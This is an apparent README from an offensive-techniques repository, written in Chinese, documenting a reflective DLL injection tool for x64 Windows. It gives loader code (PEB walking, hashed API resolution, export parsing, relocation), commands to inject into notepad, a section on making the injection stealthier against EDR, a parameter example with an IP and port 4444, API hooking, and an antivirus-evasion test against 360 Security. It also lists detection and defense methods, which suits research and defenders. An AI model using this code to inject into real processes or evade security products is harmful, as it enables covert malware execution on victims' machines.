# Reflective DLL Injection (x64)

反射 DLL 注入技术 - DLL 自己实现 PE 加载器，在内存中完成加载，绕过 LoadLibrary。

## 📚 技术原理

### 什么是反射加载？

**传统 DLL 注入**：
```
注入器 → VirtualAllocEx → WriteProcessMemory(DLL路径) → CreateRemoteThread(LoadLibrary)
                                                              ↓
                                            Windows加载器解析PE、处理导入、重定位
```

**反射 DLL 注入**：
```
注入器 → VirtualAllocEx → WriteProcessMemory(完整DLL) → CreateRemoteThread(ReflectiveLoader)
                                                             ↓
                                        DLL自己的加载器解析PE、处理导入、重定位
```

### 核心创新

**DLL 自己实现 PE 加载器**：
- 不使用 Windows 的 LoadLibrary API
- DLL 导出 `ReflectiveLoader` 函数
- ReflectiveLoader 负责加载自己

### 注入流程

```
┌─────────────────────────────────────────────────────────┐
│ Injector 进程                                           │
├─────────────────────────────────────────────────────────┤
│ 1. 读取 DLL 文件到内存                                  │
│ 2. 解析 DLL 导出表，查找 ReflectiveLoader 函数偏移     │
│ 3. VirtualAllocEx - 在目标进程分配 RWX 内存            │
│ 4. WriteProcessMemory - 写入完整 DLL                   │
│ 5. CreateRemoteThread(ReflectiveLoader地址, NULL)      │
└─────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│ Target 进程 - ReflectiveLoader 执行                     │
├─────────────────────────────────────────────────────────┤
│ STEP 0: 计算 DLL 当前在内存中的位置                     │
│   - 从 caller() 返回地址向后搜索 MZ/PE 头               │
│                                                         │
│ STEP 1: 解析 kernel32.dll 和 ntdll.dll 导出表          │
│   - 通过 PEB (GS:[0x60]) 遍历模块链表                  │
│   - 计算模块名称哈希 (避免使用字符串)                   │
│   - 手动解析导出表获取需要的 API:                       │
│     * LoadLibraryA                                      │
│     * GetProcAddress                                    │
│     * VirtualAlloc                                      │
│     * NtFlushInstructionCache                           │
│                                                         │
│ STEP 2: 分配新内存并复制 PE 头                          │
│   - VirtualAlloc(SizeOfImage, RWX)                      │
│   - 复制 PE 头 (SizeOfHeaders 字节)                    │
│                                                         │
│ STEP 3: 复制所有节                                      │
│   - 遍历节表                                            │
│   - 按 VirtualAddress 复制到新位置                     │
│                                                         │
│ STEP 4: 处理导入表                                      │
│   - LoadLibraryA 加载依赖的 DLL                        │
│   - GetProcAddress 解析导入函数                         │
│   - 填充 IAT (Import Address Table)                    │
│                                                         │
│ STEP 5: 处理重定位表                                    │
│   - 计算地址差值 (delta)                                │
│   - 遍历重定位块                                        │
│   - 修正所有需要重定位的地址                            │
│                                                         │
│ STEP 6: 调用 DllMain(DLL_PROCESS_ATTACH)               │
│   - NtFlushInstructionCache 刷新缓存                    │
│   - 调用入口点                                          │
└─────────────────────────────────────────────────────────┘
```

## 🔑 关键技术细节

### 1. Position Independent Code (PIC)

ReflectiveLoader 必须是位置无关代码，因为它在 DLL 加载前执行。

**避免使用**：
- 全局变量（会触发重定位）
- 字符串常量（使用哈希替代）
- 外部函数调用（手动解析 API）

**技术手段**：
```c
// ❌ 不能这样
char *str = "kernel32.dll";  // 字符串地址需要重定位

// ✅ 应该这样
#define KERNEL32DLL_HASH 0x6A4ABC5B  // 预计算哈希值
```

### 2. 哈希函数识别 DLL 和 API

```c
// ROR13 哈希算法
DWORD hash(char *c) {
    DWORD h = 0;
    do {
        h = ror(h);      // 循环右移 13 位
        h += *c;         // 加上字符
    } while (*++c);
    return h;
}

// 预计算的哈希值
#define KERNEL32DLL_HASH      0x6A4ABC5B
#define LOADLIBRARYA_HASH     0xEC0E4E8E
#define GETPROCADDRESS_HASH   0x7C0DFCAA
```

**优势**：
- 避免字符串常量
- 减少代码大小
- 提高执行效率

### 3. PEB 遍历查找 kernel32.dll

```c
// 获取 PEB (x64: GS:[0x60])
uiBaseAddress = __readgsqword(0x60);

// PEB → Ldr
uiBaseAddress = ((PPEB)uiBaseAddress)->pLdr;

// 遍历 InMemoryOrderModuleList
uiValueA = ((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;

while (uiValueA) {
    // 获取模块名并计算哈希
    uiValueB = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;

    // 比较哈希值
    if (uiValueC == KERNEL32DLL_HASH) {
        // 找到 kernel32.dll
        uiBaseAddress = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;
        break;
    }

    uiValueA = DEREF(uiValueA);  // 下一个模块
}
```

### 4. 手动解析导出表

```c
// 获取 NT 头
uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

// 获取导出目录
uiNameArray = &((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
uiExportDir = uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress;

// 获取导出函数名称数组
uiNameArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames;

// 遍历导出函数
while (usCounter > 0) {
    dwHashValue = hash((char *)(uiBaseAddress + DEREF_32(uiNameArray)));

    if (dwHashValue == LOADLIBRARYA_HASH) {
        // 通过序号获取函数地址
        uiAddressArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions;
        uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

        pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));
    }

    uiNameArray += sizeof(DWORD);
    uiNameOrdinals += sizeof(WORD);
}
```

### 5. PE 重定位算法

```c
// 计算地址差值
uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

// 遍历重定位块
while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock) {
    uiValueA = uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress;
    uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
    uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

    // 处理每个重定位条目
    while (uiValueB--) {
        if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64) {
            // x64: 64位地址重定位
            *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
        }

        uiValueD += sizeof(IMAGE_RELOC);
    }

    uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
}
```

## 💻 编译

### Windows (GCC/MinGW)

```bash
cd techniques/15-reflective-dll-injection
./build.bat
```

### Linux/macOS (交叉编译)

```bash
./build.sh
```

需要安装 MinGW:
```bash
# Ubuntu/Debian
sudo apt install mingw-w64

# macOS
brew install mingw-w64
```

## 🚀 使用示例

### 基本用法

```bash
cd build

# 启动目标进程
start notepad

# 方式1: 使用进程名
inject.exe notepad.exe

# 方式2: 使用 PID
inject.exe 1234

# 方式3: 指定自定义 DLL
inject.exe notepad.exe C:\path\to\custom.dll
```

### 输出示例

```
╔══════════════════════════════════════════════════════════╗
║         Reflective DLL Injection Tool (x64)             ║
╚══════════════════════════════════════════════════════════╝

[*] 目标进程 ID: 15432
[*] DLL 文件: reflective_dll.dll
[+] DLL 文件大小: 16384 字节
[+] DLL 文件已加载到内存
[+] 调试权限已提升
[+] 目标进程已打开
[+] 目标进程架构: x64

[*] 开始反射注入...
──────────────────────────────────────────────────────────
[*] ReflectiveLoader 偏移: 0x1120
[+] 远程内存分配: 0x00007FF7A2B40000 (大小: 16384 字节)
[+] DLL 已写入远程进程
[*] 远程 ReflectiveLoader 地址: 0x00007FF7A2B41120
[+] 远程线程已创建: TID=18264
──────────────────────────────────────────────────────────

[+] ✅ 反射注入成功!
[*] 等待远程线程执行...
[+] 远程线程已退出，退出代码: 0x00007FF7A2B414D0
```

目标进程会弹出消息框确认注入成功。

## 📝 DLL 开发要求

### 必须导出 ReflectiveLoader

**方式1: 包含 ReflectiveLoader.c**
```c
// 定义自定义 DllMain 标志
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

// 包含反射加载器代码
#include "ReflectiveLoader.c"

// 实现自定义 DllMain
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(NULL, "DLL Loaded!", "Success", MB_OK);
            break;
    }
    return TRUE;
}
```

**方式2: 手动实现 ReflectiveLoader**
```c
// 导出函数
__declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(VOID) {
    // 实现完整的 PE 加载逻辑
    // (参考 src/ReflectiveLoader.c)
}
```

### 编译选项

```bash
# 使用 GCC 编译
gcc -shared \
    your_dll.c \
    -o your_dll.dll \
    -m64 \
    -O2 \
    -s \
    -DDLLEXPORT="__declspec(dllexport)" \
    -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
```

## ⚠️ 限制与注意事项

### 技术限制

| 限制 | 说明 |
|------|------|
| **仅支持 x64** | 代码专门为 x64 优化，不支持 x86 |
| **需要 RWX 内存** | VirtualAllocEx(PAGE_EXECUTE_READWRITE) - 易被 EDR 检测 |
| **DLL 导出要求** | 必须导出 ReflectiveLoader 函数 |
| **架构匹配** | 注入器和目标进程必须都是 x64 |
| **无跨会话** | 不能跨用户会话注入 |

### 为什么需要 RWX 内存？

```
传统 DLL 注入:
  - 写入 DLL 路径: RW 内存
  - LoadLibrary 执行: 无需注入器分配的内存可执行

反射 DLL 注入:
  - 写入完整 DLL: 需要 RWX
  - ReflectiveLoader 在这块内存中执行
  - 代码和数据在同一块内存
```

### 检测特征

**高危行为**：
1. VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)
2. WriteProcessMemory 写入大量可执行代码
3. CreateRemoteThread 指向非模块地址

**EDR 检测点**：
- 监控 RWX 内存分配
- 检测远程线程起始地址
- 扫描未注册的内存模块

## 📊 与其他注入技术的对比

| 特性 | Reflective DLL | Classic DLL | Shellcode | Process Hollowing |
|------|----------------|-------------|-----------|-------------------|
| **LoadLibrary** | ❌ 不使用 | ✅ 使用 | ❌ 不使用 | ❌ 不使用 |
| **DLL 落地** | ✅ 不需要 | ❌ 需要 | ✅ 不需要 | ✅ 不需要 |
| **ETW 事件** | ✅ 绕过 LoadLibrary 事件 | ❌ 触发 | ✅ 绕过 | ✅ 绕过 |
| **模块列表** | ❌ 不在列表 | ✅ 在列表 | ❌ 不在列表 | ✅ 在列表 |
| **内存保护** | RWX (高危) | RX (正常) | RWX (高危) | RX (正常) |
| **复杂度** | 非常高 | 低 | 中 | 高 |
| **隐蔽性** | 高 (无 LoadLibrary) | 低 | 高 | 非常高 |
| **检测难度** | 中 (RWX内存) | 低 | 中 (RWX内存) | 高 |
| **稳定性** | 高 | 非常高 | 中 | 中 |
| **维护性** | 低 | 高 | 低 | 低 |

### 反射 DLL vs 经典 DLL 注入

**经典 DLL 注入**:
```c
// 1. 写入 DLL 路径
char dllPath[] = "C:\\evil.dll";
WriteProcessMemory(hProcess, pRemote, dllPath, sizeof(dllPath), NULL);

// 2. 调用 LoadLibrary
CreateRemoteThread(hProcess, NULL, 0, LoadLibraryA, pRemote, 0, NULL);

// 触发事件:
//   - Sysmon Event ID 7 (ImageLoad)
//   - ETW: Microsoft-Windows-Kernel-Process
//   - DLL 出现在模块列表
```

**反射 DLL 注入**:
```c
// 1. 写入完整 DLL
WriteProcessMemory(hProcess, pRemote, dllBuffer, dllSize, NULL);

// 2. 调用 ReflectiveLoader
CreateRemoteThread(hProcess, NULL, 0, pReflectiveLoader, NULL, 0, NULL);

// 绕过:
//   - ✅ 无 ImageLoad 事件
//   - ✅ 无 LoadLibrary ETW
//   - ✅ 不在模块列表
// 但:
//   - ❌ RWX 内存分配 (高度可疑)
```

## 🔍 检测与防御

### 检测方法

1. **内存扫描**
   ```c
   // 扫描 RWX 内存
   VirtualQueryEx(hProcess, pAddress, &mbi, sizeof(mbi));
   if (mbi.Protect == PAGE_EXECUTE_READWRITE) {
       // 可疑: RWX 内存
   }
   ```

2. **未注册模块检测**
   ```c
   // 枚举所有内存区域
   // 查找包含 PE 头但不在模块列表的内存
   ```

3. **线程起始地址分析**
   ```c
   // 检查远程线程起始地址
   if (!IsAddressInModule(threadStartAddress)) {
       // 可疑: 起始地址不在任何模块中
   }
   ```

4. **ETW 监控**
   - 监控 VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)
   - 监控 CreateRemoteThread 指向非模块地址

### 防御措施

1. **禁止 RWX 内存** - Windows Defender Exploit Guard
2. **内存扫描** - 定期扫描进程内存
3. **行为分析** - 检测可疑的注入模式
4. **代码签名** - 只加载签名的 DLL

### 改进隐蔽性

**问题**: VirtualAllocEx(..., PAGE_EXECUTE_READWRITE) 太可疑

**改进**:
```c
// 1. 分配 RW 内存
LPVOID pMem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE);

// 2. 写入 DLL
WriteProcessMemory(hProcess, pMem, dllBuffer, size, NULL);

// 3. 改为 RX
DWORD oldProtect;
VirtualProtectEx(hProcess, pMem, size, PAGE_EXECUTE_READ, &oldProtect);

// 4. 创建线程
CreateRemoteThread(hProcess, NULL, 0, pReflectiveLoader, NULL, 0, NULL);
```

## 🛠️ 高级用法

### 1. 参数传递

```c
// 注入器
typedef struct {
    char targetIP[16];
    int targetPort;
} InjectionParams;

InjectionParams params = {"192.168.1.1", 4444};

// 传递参数
LoadRemoteLibraryR(hProcess, dllBuffer, dllSize, &params);

// DLL 中接收
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        InjectionParams *params = (InjectionParams*)lpReserved;
        // 使用 params->targetIP 和 params->targetPort
    }
    return TRUE;
}
```

### 2. 内存中加载额外 DLL

```c
// 在 DLL_PROCESS_ATTACH 中
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // 加载其他 DLL
        LoadLibraryA("advapi32.dll");
        LoadLibraryA("ws2_32.dll");

        // 使用这些 DLL 的功能
    }
    return TRUE;
}
```

### 3. API 钩子

```c
// 结合 MinHook 或 Detours
#include <MinHook.h>

typedef int (WINAPI *MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
MessageBoxA_t pOriginalMessageBoxA = NULL;

int WINAPI HookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
    // 拦截 MessageBox 调用
    return pOriginalMessageBoxA(hWnd, "Hooked!", lpCaption, uType);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        MH_Initialize();
        MH_CreateHook(&MessageBoxA, &HookedMessageBoxA, (void**)&pOriginalMessageBoxA);
        MH_EnableHook(&MessageBoxA);
    }
    return TRUE;
}
```

## 📚 参考资料

- **原始论文**: Stephen Fewer - Reflective DLL Injection (Harmony Security)
- **GitHub**: https://github.com/stephenfewer/ReflectiveDLLInjection
- **MITRE ATT&CK**: T1055.001 - DLL Injection
- **PE 格式**: Microsoft PE and COFF Specification

## ⚖️ 免责声明

此工具仅用于安全研究和教育目的。未经授权使用此技术可能违反法律。使用者需自行承担相关责任。

## 🔗 相关技术

- **DLL Injection (CreateRemoteThread)** - `techniques/12-dll-injection/`
- **Shellcode Injection** - `techniques/13-shellcode-injection/`
- **Process Hollowing** - `techniques/01-process-hollowing/`
- **Manual Mapping** - 类似技术，手动映射 DLL

## 杀软测试

### 360安全卫士 13.0.10.2001（核晶模式）

**测试时间:** 2025-11

**测试结果:** ⚠️ **需验证** - cmd显示执行成功

**观察:**
- 命令行输出了成功信息
- 但目标进程行为需进一步验证确认

**建议:**
- 检查目标进程内存是否真实加载DLL
- 验证DLL功能是否正常执行
- 可能需要添加日志或调试信息

